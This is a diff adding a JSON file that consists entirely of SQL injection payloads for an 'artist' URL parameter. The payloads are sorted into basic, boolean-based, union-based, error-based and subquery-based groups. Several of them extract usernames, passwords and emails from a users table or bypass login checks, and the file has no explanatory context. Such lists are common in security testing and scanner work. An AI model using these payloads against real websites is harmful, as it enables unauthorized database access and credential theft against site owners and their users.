@@ -1,0 +1,31 @@
+{
+    "basic": [
+        "?artist=1'",
+        "?artist=1'--",
+        "?artist=admin' #",
+        "?artist=' OR 'a'='a"
+    ],
+    "boolean-based": [
+        "?artist=1 OR 1=1",
+        "?artist=1' OR 1=1--",
+        "?artist=1' AND 1=0--",
+        "?artist=1' AND '1'='1'--"
+    ],
+    "union-based": [
+        "?artist=1' UNION SELECT NULL--",
+        "?artist=1' UNION SELECT username, password FROM users--",
+        "?artist=1' AND 1=0 UNION SELECT * FROM users--"
+    ],
+    "error-based": [
+        "?artist=1' AND (SELECT COUNT(*) FROM users) > 0--",
+        "?artist=1' OR EXISTS(SELECT * FROM users)--"
+    ],
+    "subquery-based": [
+        "?artist=1' AND (SELECT * FROM users WHERE username='admin')--",
+        "?artist=1' OR (SELECT username FROM users WHERE username='admin')--",
+        "?artist=1' AND (SELECT password FROM users WHERE username='admin')--",
+        "?artist=1' OR (SELECT email FROM users WHERE username='admin')--",
+        "?artist=1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--",
+        "?artist=1' OR (SELECT COUNT(*) FROM users WHERE username='admin') = 1--"
+    ]
+}
